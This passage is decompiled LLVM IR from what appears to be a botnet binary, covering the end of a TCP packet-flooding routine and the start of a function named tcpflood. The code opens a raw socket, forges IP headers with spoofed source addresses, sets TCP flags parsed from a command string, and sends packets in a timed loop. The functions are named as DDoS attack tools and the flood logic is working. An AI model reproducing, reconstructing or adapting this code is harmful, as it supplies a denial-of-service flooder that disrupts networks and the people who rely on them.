  %v2_1000aad4 = inttoptr i32 %v1_1000aad4 to i32*
  %v3_1000aad4 = load i32, i32* %v2_1000aad4, align 4
  %v1_1000aae0 = add i32 %tmp, 16
  %v2_1000aae0 = inttoptr i32 %v1_1000aae0 to i32*
  %v3_1000aae0 = load i32, i32* %v2_1000aae0, align 4
  %v1_1000aaec = add i32 %tmp, 20
  %v2_1000aaec = inttoptr i32 %v1_1000aaec to i32*
  %v3_1000aaec = load i32, i32* %v2_1000aaec, align 4
  %v1_1000aaf8 = add i32 %tmp, 24
  %v2_1000aaf8 = inttoptr i32 %v1_1000aaf8 to i32*
  %v3_1000aaf8 = load i32, i32* %v2_1000aaf8, align 4
  store i32 2, i32* %stack_var_-76, align 4
  %v3_1000ab14 = icmp eq i32 %v3_1000aabc, 0
  br i1 %v3_1000ab14, label %dec_label_pc_1000ab1c, label %dec_label_pc_1000ab30

dec_label_pc_1000ab1c:                            ; preds = %dec_label_pc_1000aaa4
  %v0_1000ab1c = call i32 @rand_cmwc()
  br label %dec_label_pc_1000ab48

dec_label_pc_1000ab30:                            ; preds = %dec_label_pc_1000aaa4
  %v1_1000ab34 = urem i32 %v3_1000aabc, 65536
  store i32 %v1_1000ab34, i32* @r3, align 4
  %v1_1000ab3c = call i32 @htons(i32 %v1_1000ab34)
  br label %dec_label_pc_1000ab48

dec_label_pc_1000ab48:                            ; preds = %dec_label_pc_1000ab1c, %dec_label_pc_1000ab30
  %v2_1000ab48 = ptrtoint i32* %stack_var_-76 to i32
  %v4_1000ab58 = call i32 @getHost(i32 %v2_1000aab0, i32* nonnull %stack_var_-72, i32 %v2_1000ab48)
  %v3_1000ab60 = icmp eq i32 %v4_1000ab58, 0
  br i1 %v3_1000ab60, label %dec_label_pc_1000ab6c, label %dec_label_pc_1000b164

dec_label_pc_1000ab6c:                            ; preds = %dec_label_pc_1000ab48
  %v2_1000ab70 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_1000ab70, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000ab84.466 to i32), i32* @lr, align 4
  %v0_1000ab80 = call i32 @__GI_memset()
  store i32 268479380, i32* @lr, align 4
  %v3_1000ab90 = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000aba0 = icmp eq i32 %v3_1000ab90, 0
  br i1 %v3_1000aba0, label %dec_label_pc_1000b164, label %dec_label_pc_1000abac

dec_label_pc_1000abac:                            ; preds = %dec_label_pc_1000ab6c
  store i32 1, i32* %stack_var_-60, align 4
  %v2_1000abb4 = ptrtoint i32* %stack_var_-60 to i32
  store i32 268479440, i32* @lr, align 4
  %v5_1000abcc = call i32 @__GI_setsockopt(i32 %v3_1000ab90, i32 0, i32 3, i32 %v2_1000abb4, i32 4)
  %tmp60 = icmp sgt i32 %v5_1000abcc, -1
  br i1 %tmp60, label %dec_label_pc_1000abe0, label %dec_label_pc_1000b164

dec_label_pc_1000abe0:                            ; preds = %dec_label_pc_1000abac
  %v3_1000abe4 = icmp eq i32 %v3_1000aaf8, 0
  br i1 %v3_1000abe4, label %dec_label_pc_1000ac10, label %dec_label_pc_1000abf8

dec_label_pc_1000abf8:                            ; preds = %dec_label_pc_1000abe0
  br label %dec_label_pc_1000ac10

dec_label_pc_1000ac10:                            ; preds = %dec_label_pc_1000abe0, %dec_label_pc_1000abf8
  %v1_1000ac14 = add i32 %v3_1000aae0, 40
  %v1_1000ac24 = add i32 %v3_1000aae0, 70
  %v1_1000ac28 = and i32 %v1_1000ac24, -16
  %v2_1000ac30 = load i32, i32* %stack_var_-144, align 4
  %v1_1000ac38 = load i32, i32* @r1, align 4
  %v3_1000ac38 = sub i32 %v1_1000ac38, %v1_1000ac28
  %v4_1000ac38 = inttoptr i32 %v3_1000ac38 to i32*
  store i32 %v2_1000ac30, i32* %v4_1000ac38, align 4
  %v1_1000ac48 = add i32 %v3_1000ac38, 23
  %v1_1000ac4c = and i32 %v1_1000ac48, -16
  %v1_1000ac6c = add i32 %v1_1000ac4c, 20
  %v5_1000ac70 = inttoptr i32 %v1_1000ac6c to i16*
  %v3_1000ac74 = load i32, i32* %stack_var_-72, align 4
  store i32 %v3_1000ac74, i32* @r29, align 4
  %v0_1000ac78 = call i32 @getspoof()
  store i32 %v0_1000ac78, i32* @r3, align 4
  %v1_1000ac84 = call i32 @htonl(i32 %v0_1000ac78)
  %v1_1000ac90 = add i32 %v3_1000aae0, 20
  %v0_1000ac98 = load i32, i32* @r29, align 4
  %v6_1000aca8 = inttoptr i32 %v1_1000ac4c to i32*
  %v7_1000aca8 = call i32 @makeIPPacket(i32* %v6_1000aca8, i32 %v0_1000ac98, i32 %v1_1000ac84, i32 6, i32 %v1_1000ac90, i32 %v3_1000aae0)
  %v0_1000acac = call i32 @rand_cmwc()
  %v1_1000acbc = trunc i32 %v0_1000acac to i16
  store i16 %v1_1000acbc, i16* %v5_1000ac70, align 4
  %v0_1000acc0 = call i32 @rand_cmwc()
  %v2_1000accc = add i32 %v1_1000ac4c, 24
  %v3_1000accc = inttoptr i32 %v2_1000accc to i32*
  store i32 %v0_1000acc0, i32* %v3_1000accc, align 8
  %v2_1000acd8 = add i32 %v1_1000ac4c, 28
  %v3_1000acd8 = inttoptr i32 %v2_1000acd8 to i32*
  store i32 0, i32* %v3_1000acd8, align 4
  %v1_1000ace0 = add i32 %v1_1000ac4c, 32
  %v2_1000ace0 = inttoptr i32 %v1_1000ace0 to i32*
  %v1_1000ace8 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000acec = add i32 %v1_1000ac4c, 32
  %v3_1000acec = inttoptr i32 %v2_1000acec to i32*
  store i32 %v1_1000ace8, i32* %v3_1000acec, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_1002b208.354 to i32), i32* @r4, align 4
  %v3_1000ad00 = inttoptr i32 %v3_1000aad4 to i8*
  %v4_1000ad00 = call i32 @__GI_strcoll(i8* %v3_1000ad00, i32 ptrtoint ([4 x i8]* @global_var_1002b208.354 to i32))
  %v3_1000ad08 = icmp eq i32 %v4_1000ad00, 0
  br i1 %v3_1000ad08, label %dec_label_pc_1000ad10, label %dec_label_pc_1000ad74

dec_label_pc_1000ad10:                            ; preds = %dec_label_pc_1000ac10
  %v3_1000ad14 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000ad68 = or i32 %v3_1000ad14, 4128768
  store i32 %v1_1000ad68, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af84

dec_label_pc_1000ad74:                            ; preds = %dec_label_pc_1000ac10
  store i32 ptrtoint ([5 x i8]* @global_var_1002b20c.355 to i32), i32* @r4, align 4
  %v4_1000ad84 = call i32 @__GI_strcoll(i8* %v3_1000ad00, i32 ptrtoint ([5 x i8]* @global_var_1002b20c.355 to i32))
  %v3_1000ad8c = icmp eq i32 %v4_1000ad84, 0
  br i1 %v3_1000ad8c, label %dec_label_pc_1000ad94, label %dec_label_pc_1000adc8

dec_label_pc_1000ad94:                            ; preds = %dec_label_pc_1000ad74
  %v3_1000ad98 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000adbc = or i32 %v3_1000ad98, 2686976
  store i32 %v1_1000adbc, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af84

dec_label_pc_1000adc8:                            ; preds = %dec_label_pc_1000ad74
  store i32 ptrtoint ([5 x i8]* @global_var_1002b214.356 to i32), i32* @r4, align 4
  %v4_1000add8 = call i32 @__GI_strcoll(i8* %v3_1000ad00, i32 ptrtoint ([5 x i8]* @global_var_1002b214.356 to i32))
  %v3_1000ade0 = icmp eq i32 %v4_1000add8, 0
  br i1 %v3_1000ade0, label %dec_label_pc_1000ade8, label %dec_label_pc_1000ae0c

dec_label_pc_1000ade8:                            ; preds = %dec_label_pc_1000adc8
  %v3_1000adec = load i32, i32* %v2_1000ace0, align 16
  %v1_1000ae00 = or i32 %v3_1000adec, 2228224
  store i32 %v1_1000ae00, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af84

dec_label_pc_1000ae0c:                            ; preds = %dec_label_pc_1000adc8
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268480032, i32* @lr, align 4
  %v4_1000ae1c = call i32 @__GI_strtok(i32 %v3_1000aad4, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000af7c17 = icmp eq i32 %v4_1000ae1c, 0
  br i1 %v3_1000af7c17, label %dec_label_pc_1000af84, label %dec_label_pc_1000ae2c

dec_label_pc_1000ae2c:                            ; preds = %dec_label_pc_1000ae0c, %dec_label_pc_1000af60
  %storemerge1218 = phi i32 [ %v4_1000af6c, %dec_label_pc_1000af60 ], [ %v4_1000ae1c, %dec_label_pc_1000ae0c ]
  store i32 ptrtoint ([4 x i8]* @global_var_1002b230.360 to i32), i32* @r4, align 4
  %v3_1000ae3c = inttoptr i32 %storemerge1218 to i8*
  %v4_1000ae3c = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([4 x i8]* @global_var_1002b230.360 to i32))
  %v3_1000ae44 = icmp eq i32 %v4_1000ae3c, 0
  br i1 %v3_1000ae44, label %dec_label_pc_1000ae4c, label %dec_label_pc_1000ae60

dec_label_pc_1000ae4c:                            ; preds = %dec_label_pc_1000ae2c
  %v3_1000ae50 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000ae54 = or i32 %v3_1000ae50, 131072
  store i32 %v1_1000ae54, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af60

dec_label_pc_1000ae60:                            ; preds = %dec_label_pc_1000ae2c
  store i32 ptrtoint ([4 x i8]* @global_var_1002b234.361 to i32), i32* @r4, align 4
  %v4_1000ae70 = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([4 x i8]* @global_var_1002b234.361 to i32))
  %v3_1000ae78 = icmp eq i32 %v4_1000ae70, 0
  br i1 %v3_1000ae78, label %dec_label_pc_1000ae80, label %dec_label_pc_1000ae94

dec_label_pc_1000ae80:                            ; preds = %dec_label_pc_1000ae60
  %v3_1000ae84 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000ae88 = or i32 %v3_1000ae84, 262144
  store i32 %v1_1000ae88, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af60

dec_label_pc_1000ae94:                            ; preds = %dec_label_pc_1000ae60
  store i32 ptrtoint ([4 x i8]* @global_var_1002b238.362 to i32), i32* @r4, align 4
  %v4_1000aea4 = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([4 x i8]* @global_var_1002b238.362 to i32))
  %v3_1000aeac = icmp eq i32 %v4_1000aea4, 0
  br i1 %v3_1000aeac, label %dec_label_pc_1000aeb4, label %dec_label_pc_1000aec8

dec_label_pc_1000aeb4:                            ; preds = %dec_label_pc_1000ae94
  %v3_1000aeb8 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000aebc = or i32 %v3_1000aeb8, 65536
  store i32 %v1_1000aebc, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af60

dec_label_pc_1000aec8:                            ; preds = %dec_label_pc_1000ae94
  store i32 ptrtoint ([4 x i8]* @global_var_1002b23c.363 to i32), i32* @r4, align 4
  %v4_1000aed8 = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([4 x i8]* @global_var_1002b23c.363 to i32))
  %v3_1000aee0 = icmp eq i32 %v4_1000aed8, 0
  br i1 %v3_1000aee0, label %dec_label_pc_1000aee8, label %dec_label_pc_1000aefc

dec_label_pc_1000aee8:                            ; preds = %dec_label_pc_1000aec8
  %v3_1000aeec = load i32, i32* %v2_1000ace0, align 16
  %v1_1000aef0 = or i32 %v3_1000aeec, 1048576
  store i32 %v1_1000aef0, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af60

dec_label_pc_1000aefc:                            ; preds = %dec_label_pc_1000aec8
  store i32 ptrtoint ([4 x i8]* @global_var_1002b240.364 to i32), i32* @r4, align 4
  %v4_1000af0c = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([4 x i8]* @global_var_1002b240.364 to i32))
  %v3_1000af14 = icmp eq i32 %v4_1000af0c, 0
  br i1 %v3_1000af14, label %dec_label_pc_1000af1c, label %dec_label_pc_1000af30

dec_label_pc_1000af1c:                            ; preds = %dec_label_pc_1000aefc
  %v3_1000af20 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000af24 = or i32 %v3_1000af20, 524288
  store i32 %v1_1000af24, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af60

dec_label_pc_1000af30:                            ; preds = %dec_label_pc_1000aefc
  store i32 ptrtoint ([4 x i8]* @global_var_1002b244.365 to i32), i32* @r4, align 4
  %v4_1000af40 = call i32 @__GI_strcoll(i8* %v3_1000ae3c, i32 ptrtoint ([4 x i8]* @global_var_1002b244.365 to i32))
  %v3_1000af48 = icmp eq i32 %v4_1000af40, 0
  br i1 %v3_1000af48, label %dec_label_pc_1000af50, label %dec_label_pc_1000af60

dec_label_pc_1000af50:                            ; preds = %dec_label_pc_1000af30
  %v3_1000af54 = load i32, i32* %v2_1000ace0, align 16
  %v1_1000af58 = or i32 %v3_1000af54, 2097152
  store i32 %v1_1000af58, i32* %v2_1000ace0, align 16
  br label %dec_label_pc_1000af60

dec_label_pc_1000af60:                            ; preds = %dec_label_pc_1000af30, %dec_label_pc_1000af1c, %dec_label_pc_1000aee8, %dec_label_pc_1000aeb4, %dec_label_pc_1000ae80, %dec_label_pc_1000ae4c, %dec_label_pc_1000af50
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
  store i32 268480368, i32* @lr, align 4
  %v4_1000af6c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v3_1000af7c = icmp eq i32 %v4_1000af6c, 0
  br i1 %v3_1000af7c, label %dec_label_pc_1000af84, label %dec_label_pc_1000ae2c

dec_label_pc_1000af84:                            ; preds = %dec_label_pc_1000af60, %dec_label_pc_1000ae0c, %dec_label_pc_1000ade8, %dec_label_pc_1000ad94, %dec_label_pc_1000ad10
  %v3_1000af8c = add i32 %v1_1000ac4c, 34
  %v4_1000af8c = inttoptr i32 %v3_1000af8c to i16*
  store i16 2048, i16* %v4_1000af8c, align 2
  %v3_1000af98 = add i32 %v1_1000ac4c, 36
  %v4_1000af98 = inttoptr i32 %v3_1000af98 to i16*
  store i16 0, i16* %v4_1000af98, align 4
  %v3_1000afa4 = add i32 %v1_1000ac4c, 38
  %v4_1000afa4 = inttoptr i32 %v3_1000afa4 to i16*
  store i16 0, i16* %v4_1000afa4, align 2
  br i1 %v3_1000ab14, label %dec_label_pc_1000afb4, label %dec_label_pc_1000afc8

dec_label_pc_1000afb4:                            ; preds = %dec_label_pc_1000af84
  %v0_1000afb4 = call i32 @rand_cmwc()
  %extract.t64 = trunc i32 %v0_1000afb4 to i16
  br label %dec_label_pc_1000afe0

dec_label_pc_1000afc8:                            ; preds = %dec_label_pc_1000af84
  %v1_1000afcc = urem i32 %v3_1000aabc, 65536
  store i32 %v1_1000afcc, i32* @r3, align 4
  %v1_1000afd4 = call i32 @htons(i32 %v1_1000afcc)
  %extract.t = trunc i32 %v1_1000afd4 to i16
  br label %dec_label_pc_1000afe0

dec_label_pc_1000afe0:                            ; preds = %dec_label_pc_1000afb4, %dec_label_pc_1000afc8
  %storemerge61.off0 = phi i16 [ %extract.t, %dec_label_pc_1000afc8 ], [ %extract.t64, %dec_label_pc_1000afb4 ]
  %v3_1000afe8 = add i32 %v1_1000ac4c, 22
  %v4_1000afe8 = inttoptr i32 %v3_1000afe8 to i16*
  store i16 %storemerge61.off0, i16* %v4_1000afe8, align 2
  %v2_1000affc = inttoptr i32 %v1_1000ac4c to i16*
  %v3_1000affc = call i32 @csum(i16* %v2_1000affc, i32 %v1_1000ac6c)
  %v1_1000b008 = trunc i32 %v3_1000affc to i16
  store i16 %v1_1000b008, i16* %v4_1000af98, align 4
  %v1_1000b018 = or i32 %v1_1000ac4c, 2
  %v2_1000b018 = inttoptr i32 %v1_1000b018 to i16*
  %v3_1000b018 = load i16, i16* %v2_1000b018, align 2
  %v4_1000b018 = zext i16 %v3_1000b018 to i32
  %v3_1000b028 = call i32 @csum(i16* %v2_1000affc, i32 %v4_1000b018)
  %sext3 = mul i32 %v3_1000b028, 65536
  %v1_1000b02c = sdiv i32 %sext3, 65536
  %v1_1000b034 = trunc i32 %v1_1000b02c to i16
  %v3_1000b034 = or i32 %v1_1000ac4c, 10
  %v4_1000b034 = inttoptr i32 %v3_1000b034 to i16*
  store i16 %v1_1000b034, i16* %v4_1000b034, align 2
  store i32 268480576, i32* @lr, align 4
  %v1_1000b03c = call i32 @__GI_time(i32 0)
  %v2_1000b048 = add i32 %v1_1000b03c, %v3_1000aac8
  %v2_1000b08c = or i32 %v1_1000ac4c, 12
  %v3_1000b08c = inttoptr i32 %v2_1000b08c to i32*
  %v3_1000b0a0 = or i32 %v1_1000ac4c, 4
  %v4_1000b0a0 = inttoptr i32 %v3_1000b0a0 to i16*
  br label %dec_label_pc_1000b05c

dec_label_pc_1000b05c:                            ; preds = %dec_label_pc_1000b05c.backedge, %dec_label_pc_1000afe0
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_1000afe0 ], [ %storemerge21, %dec_label_pc_1000b05c.backedge ]
  store i32 268480640, i32* @lr, align 4
  %v6_1000b07c = call i32 @sendto(i32 %v3_1000ab90, i32 %v1_1000ac4c, i32 %v1_1000ac14, i32 0, i32 %v2_1000ab48, i32 16)
  %v0_1000b080 = call i32 @getspoof()
  store i32 %v0_1000b080, i32* %v3_1000b08c, align 4
  %v0_1000b090 = call i32 @rand_cmwc()
  %v1_1000b0a0 = trunc i32 %v0_1000b090 to i16
  store i16 %v1_1000b0a0, i16* %v4_1000b0a0, align 4
  %v0_1000b0a4 = call i32 @rand_cmwc()
  store i32 %v0_1000b0a4, i32* %v3_1000accc, align 8
  %v0_1000b0b4 = call i32 @rand_cmwc()
  %v1_1000b0c4 = trunc i32 %v0_1000b0b4 to i16
  store i16 %v1_1000b0c4, i16* %v5_1000ac70, align 4
  store i16 0, i16* %v4_1000af98, align 4
  %v3_1000b0e4 = call i32 @csum(i16* %v2_1000affc, i32 %v1_1000ac6c)
  %v1_1000b0f0 = trunc i32 %v3_1000b0e4 to i16
  store i16 %v1_1000b0f0, i16* %v4_1000af98, align 4
  %v3_1000b100 = load i16, i16* %v2_1000b018, align 2
  %v4_1000b100 = zext i16 %v3_1000b100 to i32
  %v3_1000b110 = call i32 @csum(i16* %v2_1000affc, i32 %v4_1000b100)
  %v1_1000b11c = trunc i32 %v3_1000b110 to i16
  store i16 %v1_1000b11c, i16* %v4_1000b034, align 2
  %v4_1000b128 = icmp eq i32 %stack_var_-52.0, %v3_1000aaec
  br i1 %v4_1000b128, label %dec_label_pc_1000b130, label %dec_label_pc_1000b154

dec_label_pc_1000b130:                            ; preds = %dec_label_pc_1000b05c
  store i32 268480824, i32* @lr, align 4
  %v1_1000b134 = call i32 @__GI_time(i32 0)
  %v3_1000b140 = icmp sgt i32 %v1_1000b134, %v2_1000b048
  br i1 %v3_1000b140, label %dec_label_pc_1000b164, label %dec_label_pc_1000b05c.backedge

dec_label_pc_1000b05c.backedge:                   ; preds = %dec_label_pc_1000b130, %dec_label_pc_1000b154
  %storemerge21 = phi i32 [ %v1_1000b158, %dec_label_pc_1000b154 ], [ 0, %dec_label_pc_1000b130 ]
  br label %dec_label_pc_1000b05c

dec_label_pc_1000b154:                            ; preds = %dec_label_pc_1000b05c
  %v1_1000b158 = add i32 %stack_var_-52.0, 1
  br label %dec_label_pc_1000b05c.backedge

dec_label_pc_1000b164:                            ; preds = %dec_label_pc_1000b130, %dec_label_pc_1000abac, %dec_label_pc_1000ab6c, %dec_label_pc_1000ab48, %entry
  %v0_1000b18c = phi i32 [ %v5_1000abcc, %dec_label_pc_1000abac ], [ 0, %dec_label_pc_1000ab6c ], [ %v4_1000ab58, %dec_label_pc_1000ab48 ], [ %v0_1000aa90, %entry ], [ %v1_1000b134, %dec_label_pc_1000b130 ]
  ret i32 %v0_1000b18c

; uselistorder directives
  uselistorder i16* %v2_1000affc, { 0, 2, 1, 3 }
  uselistorder i32 %v1_1000afcc, { 1, 0 }
  uselistorder i32 %v4_1000af6c, { 1, 0 }
  uselistorder i32* %v2_1000ace0, { 1, 0, 3, 2, 5, 4, 7, 6, 9, 8, 11, 10, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 %v1_1000ac4c, { 12, 1, 2, 3, 4, 13, 5, 6, 7, 8, 0, 9, 10, 11, 14, 15 }
  uselistorder i32 %v2_1000ab48, { 1, 0 }
  uselistorder i32 %v1_1000ab34, { 1, 0 }
  uselistorder i32 %v3_1000aae0, { 1, 0, 3, 2 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @sendto, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 (i16*, i32)* @csum, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 18, 19, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b244.365 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b240.364 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b23c.363 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b238.362 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b234.361 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b230.360 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1002b214.356 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1002b20c.355 to i32), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint ([4 x i8]* @global_var_1002b208.354 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @htonl, { 12, 11, 10, 9, 8, 7, 6, 5, 0, 4, 3, 2, 1 }
  uselistorder i32 ()* @getspoof, { 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @rand_cmwc, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 0, 8, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_1000b05c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000afe0, { 1, 0 }
  uselistorder label %dec_label_pc_1000af60, { 6, 0, 1, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_1000ae2c, { 1, 0 }
  uselistorder label %dec_label_pc_1000ac10, { 1, 0 }
  uselistorder label %dec_label_pc_1000ab48, { 1, 0 }
}

define i32 @tcpflood(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-112 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000b190 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000b190, i32* %stack_var_-112, align 4
  %v1_1000b1c0 = call i32 @mfork(i32 %arg2)
  %v3_1000b1c8 = icmp eq i32 %v1_1000b1c0, 0
  br i1 %v3_1000b1c8, label %dec_label_pc_1000b1d0, label %dec_label_pc_1000b54c

dec_label_pc_1000b1d0:                            ; preds = %entry
  %tmp33 = icmp slt i32 %arg3, 7
  br i1 %tmp33, label %dec_label_pc_1000b27c, label %dec_label_pc_1000b1dc

dec_label_pc_1000b1dc:                            ; preds = %dec_label_pc_1000b1d0
  %v1_1000b1e0 = add i32 %arg4, 12
  %v1_1000b1e4 = inttoptr i32 %v1_1000b1e0 to i32*
  %v2_1000b1e4 = load i32, i32* %v1_1000b1e4, align 4
  store i32 268481008, i32* @lr, align 4
  %v1_1000b1ec = call i32 @atol(i32 %v2_1000b1e4)
  %v4_1000b1f8 = icmp eq i32 %v1_1000b1ec, -1
  br i1 %v4_1000b1f8, label %dec_label_pc_1000b27c, label %dec_label_pc_1000b200

dec_label_pc_1000b200:                            ; preds = %dec_label_pc_1000b1dc
  %v1_1000b204 = add i32 %arg4, 8
  %v1_1000b208 = inttoptr i32 %v1_1000b204 to i32*
  %v2_1000b208 = load i32, i32* %v1_1000b208, align 4
  store i32 268481044, i32* @lr, align 4
  %v1_1000b210 = call i32 @atol(i32 %v2_1000b208)
  %v4_1000b21c = icmp eq i32 %v1_1000b210, -1
  br i1 %v4_1000b21c, label %dec_label_pc_1000b27c, label %dec_label_pc_1000b230

dec_label_pc_1000b230:                            ; preds = %dec_label_pc_1000b200
  %v1_1000b234 = add i32 %arg4, 20
  %v1_1000b238 = inttoptr i32 %v1_1000b234 to i32*
  %v2_1000b238 = load i32, i32* %v1_1000b238, align 4
  store i32 268481092, i32* @lr, align 4
  %v1_1000b240 = call i32 @atol(i32 %v2_1000b238)
  %v1_1000b248 = icmp slt i32 %v1_1000b240, 0
  br i1 %v1_1000b248, label %dec_label_pc_1000b27c, label %dec_label_pc_1000b250

dec_label_pc_1000b250:                            ; preds = %dec_label_pc_1000b230
  %v3_1000b254 = icmp eq i32 %arg3, 7
  br i1 %v3_1000b254, label %dec_label_pc_1000b25c, label %dec_label_pc_1000b320

dec_label_pc_1000b25c:                            ; preds = %dec_label_pc_1000b250
  %v1_1000b260 = add i32 %arg4, 24
  %v1_1000b264 = inttoptr i32 %v1_1000b260 to i32*
  %v2_1000b264 = load i32, i32* %v1_1000b264, align 4
  store i32 268481136, i32* @lr, align 4
  %v1_1000b26c = call i32 @atol(i32 %v2_1000b264)
  %v2_1000b274 = icmp sgt i32 %v1_1000b26c, 0
  br i1 %v2_1000b274, label %dec_label_pc_1000b320, label %dec_label_pc_1000b27c

dec_label_pc_1000b27c:                            ; preds = %dec_label_pc_1000b25c, %dec_label_pc_1000b230, %dec_label_pc_1000b200, %dec_label_pc_1000b1dc, %dec_label_pc_1000b1d0
  %v6_1000b290 = call i32 @Send(i32 %arg1, i32 ptrtoint ([92 x i8]* @global_var_1002ba40.467 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  br label %dec_label_pc_1000b54c

dec_label_pc_1000b320:                            ; preds = %dec_label_pc_1000b250, %dec_label_pc_1000b25c
  %v1_1000b29c = add i32 %arg4, 4
  %v1_1000b2a0 = inttoptr i32 %v1_1000b29c to i32*
  %v2_1000b2a0 = load i32, i32* %v1_1000b2a0, align 4
  %v2_1000b2b0 = load i32, i32* %v1_1000b208, align 4
  store i32 268481212, i32* @lr, align 4
  %v1_1000b2b8 = call i32 @atol(i32 %v2_1000b2b0)
  %v2_1000b2cc = load i32, i32* %v1_1000b1e4, align 4
  store i32 268481240, i32* @lr, align 4
  %v1_1000b2d4 = call i32 @atol(i32 %v2_1000b2cc)
  %v1_1000b2e4 = add i32 %arg4, 16
  %v1_1000b2e8 = inttoptr i32 %v1_1000b2e4 to i32*
  %v2_1000b2e8 = load i32, i32* %v1_1000b2e8, align 4
  %v2_1000b304 = load i32, i32* %v1_1000b238, align 4
  store i32 268481296, i32* @lr, align 4
  %v1_1000b30c = call i32 @atol(i32 %v2_1000b304)
  br i1 %v3_1000b254, label %dec_label_pc_1000b334, label %dec_label_pc_1000b350

dec_label_pc_1000b334:                            ; preds = %dec_label_pc_1000b320
  %v1_1000b338 = add i32 %arg4, 24
  %v1_1000b33c = inttoptr i32 %v1_1000b338 to i32*
  %v2_1000b33c = load i32, i32* %v1_1000b33c, align 4
  store i32 268481352, i32* @lr, align 4
  %v1_1000b344 = call i32 @atol(i32 %v2_1000b33c)
  br label %dec_label_pc_1000b358

dec_label_pc_1000b350:                            ; preds = %dec_label_pc_1000b320
  br label %dec_label_pc_1000b358

dec_label_pc_1000b358:                            ; preds = %dec_label_pc_1000b334, %dec_label_pc_1000b350
  %storemerge1 = phi i32 [ 10, %dec_label_pc_1000b350 ], [ %v1_1000b344, %dec_label_pc_1000b334 ]
  %v1_1000b364 = add i32 %arg4, 28
  %v1_1000b368 = inttoptr i32 %v1_1000b364 to i32*
  %v2_1000b368 = load i32, i32* %v1_1000b368, align 4
  store i32 268481396, i32* @lr, align 4
  %v1_1000b370 = call i32 @atol(i32 %v2_1000b368)
  %v2_1000b394 = load i32, i32* %v1_1000b2a0, align 4
  store i32 268481440, i32* @lr, align 4
  %v1_1000b39c = call i32 @inet_addr(i32 %v2_1000b394)
  %v1_1000b3ac = mul i32 %v1_1000b370, 28
  %v1_1000b3b4 = add i32 %v1_1000b3ac, 30
  %v1_1000b3b8 = and i32 %v1_1000b3b4, -16
  %v2_1000b3c0 = load i32, i32* %stack_var_-112, align 4
  %v1_1000b3c8 = load i32, i32* @r1, align 4
  %v3_1000b3c8 = sub i32 %v1_1000b3c8, %v1_1000b3b8
  %v4_1000b3c8 = inttoptr i32 %v3_1000b3c8 to i32*
  store i32 %v2_1000b3c0, i32* %v4_1000b3c8, align 4
  %v1_1000b3d8 = add i32 %v3_1000b3c8, 23
  %v1_1000b3dc = and i32 %v1_1000b3d8, -16
  store i32 ptrtoint (i32* @global_var_1002b22c.359 to i32), i32* @r4, align 4
